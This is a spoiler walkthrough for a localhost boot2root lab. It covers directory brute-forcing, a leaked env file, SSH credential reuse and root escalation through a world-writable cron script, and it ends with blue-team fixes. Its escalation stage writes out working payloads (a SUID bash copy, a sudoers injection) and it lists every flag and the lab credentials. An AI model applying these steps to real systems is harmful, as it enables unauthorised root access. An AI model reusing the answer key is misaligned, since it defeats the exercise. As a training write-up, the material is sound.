# 📡 Relay — SOLUTION (spoilers)

> Full walkthrough. Don't read this unless you're really stuck or reviewing.

Boot2root kill chain: **recon → web dir brute-force → leaked env → SSH credential
reuse → CRON writable-script priv-esc.** Three flags. The root step is
deliberately NOT GTFOBins — `sudo -l` is a dead end.

Target: `localhost`, web on **8083**, SSH on **2223**.

---

## Stage 0 — Recon (nmap)

```bash
nmap -sV -p- localhost               # find everything
# or, knowing the published ports:
nmap -sV -p 2223,8083 localhost
```

- `2223/tcp` — **OpenSSH** (foothold candidate)
- `8083/tcp` — **HTTP**, Werkzeug/Flask (Python)

Same "SSH + web" boot2root shape as Sentry. The web app should hand you SSH creds.

---

## Stage 1 — Web enumeration → Flag 1 (recon)

`robots.txt` is a **red herring** this time:

```bash
curl -s localhost:8083/robots.txt
# User-agent: *
# Disallow: /admin/            <-- dead end (403, no flag)
```

`/admin/` just returns 403. The real loot is NOT signposted — **brute-force**:

```bash
gobuster dir -u http://localhost:8083 \
  -w ~/tools/SecLists/Discovery/Web-Content/common.txt
# ... /backup  (Status: 200)
```

```bash
curl -s localhost:8083/backup/
# directory listing -> deploy.env
curl -s localhost:8083/backup/deploy.env
```

`deploy.env` contains:

- **Flag 1:** `FLAG{recon_brut3f0rc3d_l3ak3d_env}`
- The foothold creds: **`svc : R3lay-Svc-2026!`**

Lesson: robots.txt is not a treasure map. Absence of a signpost is not absence of
a path — brute-forcing directories is core web recon, not a fallback.

---

## Stage 2 — Foothold over SSH → Flag 2 (user.txt)

Credential reuse again: the web-leaked `svc` password is the SSH password.

```bash
ssh svc@localhost -p 2223
# password: R3lay-Svc-2026!
cat ~/user.txt
```

- **Flag 2:** `FLAG{f00thold_svc_cr3d_r3us3}`

(Direct root SSH is disabled — `PermitRootLogin no`.)

---

## Stage 3 — Privilege escalation → Flag 3 (root.txt)

**First: confirm the dead end.** This is the teaching beat — the obvious move
fails, so you must enumerate.

```bash
sudo -l
# (svc has no sudoers entry — nothing here. Do NOT stop.)
```

**Enumerate what runs automatically.** Two convergent paths find the bug:

Path A — scheduled jobs:

```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/relay-health
# * * * * * root /opt/relay/healthcheck.sh
```

A script runs **as root, every minute**. Check its permissions:

```bash
ls -la /opt/relay/healthcheck.sh
# -rwxrwxrwx 1 root root ...   <-- WORLD-WRITABLE, root-owned, root-run
```

Path B — hunt writable files directly (LinPEAS mindset by hand):

```bash
find / -perm -0002 -type f -not -path '/proc/*' 2>/dev/null
# ... /opt/relay/healthcheck.sh
```

Either way you land on the same misconfig: **a root-run script you can write to.**

**Weaponize it.** Append a payload; it executes as root on the next tick. Cleanest
is to make a root-SUID copy of bash, then drop into a root shell:

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /opt/relay/healthcheck.sh
# wait up to ~60s for cron to fire, watch the log tick over:
tail -f /var/log/relay-health.log       # Ctrl-C once you see a new line
ls -la /tmp/rootbash                     # -rwsr-xr-x root ... => SUID landed
/tmp/rootbash -p                         # -p preserves euid=0
id                                       # euid=0(root)
cat /root/root.txt
```

- **Flag 3:** `FLAG{r00t_cr0n_w0rld_writ4ble}`

Equivalent payloads (any one works):

```bash
# grant svc passwordless sudo to everything:
echo 'echo "svc ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/pwn' >> /opt/relay/healthcheck.sh
# or just expose the flag:
echo 'cp /root/root.txt /tmp/root.txt && chmod 644 /tmp/root.txt' >> /opt/relay/healthcheck.sh
# or a reverse shell back to your host, etc.
```

> Tidy up if you like: after rooting, restore healthcheck.sh so the log job stops
> re-running your payload (`printf '#!/bin/sh\\n' > /opt/relay/healthcheck.sh` as
> root). Not required for the flag.

---

## Fixes (the blue-team half)

- **Never leave a root-run script world-writable.** A cron/systemd job that runs
  as root is only as trustworthy as the file it executes. `chmod 755` root-owned,
  and put automation scripts somewhere non-privileged users can't edit.
- **robots.txt is not access control** (and shouldn't advertise real paths either).
  Keep backups/env files off any public vhost; rotate anything that leaks.
- **No shared automation accounts with reused passwords; enforce SSH keys** and
  disable password auth.
- **Audit scheduled jobs.** `find / -perm -0002 -type f` and review every cron
  entry: who runs it, and can a lower-priv user influence what it executes?

## Flag summary

| # | Stage | Flag |
|---|-------|------|
| 1 | Recon / web dir brute-force | `FLAG{recon_brut3f0rc3d_l3ak3d_env}` |
| 2 | Foothold (user.txt) | `FLAG{f00thold_svc_cr3d_r3us3}` |
| 3 | Priv-esc (cron / writable script) | `FLAG{r00t_cr0n_w0rld_writ4ble}` |
